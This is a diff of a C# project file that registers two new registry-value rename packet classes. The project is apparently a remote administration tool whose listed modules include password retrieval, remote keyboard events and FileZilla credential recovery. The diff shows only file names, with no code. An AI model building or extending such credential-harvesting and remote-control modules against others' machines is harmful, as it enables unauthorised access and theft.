@@ -101,6 +101,7 @@
     <Compile Include="Core\Packets\ClientPackets\GetPasswordsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetRegistryKeysResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetRenameRegistryKeyResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetRenameRegistryValueResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\SetStatusFileManager.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoCreateRegistryKey.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoCreateRegistryValue.cs" />
@@ -109,6 +110,7 @@
     <Compile Include="Core\Packets\ServerPackets\DoKeyboardEvent.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoLoadRegistryKey.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoRenameRegistryKey.cs" />
+    <Compile Include="Core\Packets\ServerPackets\DoRenameRegistryValue.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetPasswords.cs" />
     <Compile Include="Core\Packets\ServerPackets\SetAuthenticationSuccess.cs" />
     <Compile Include="Core\Recovery\FtpClients\FileZilla.cs" />
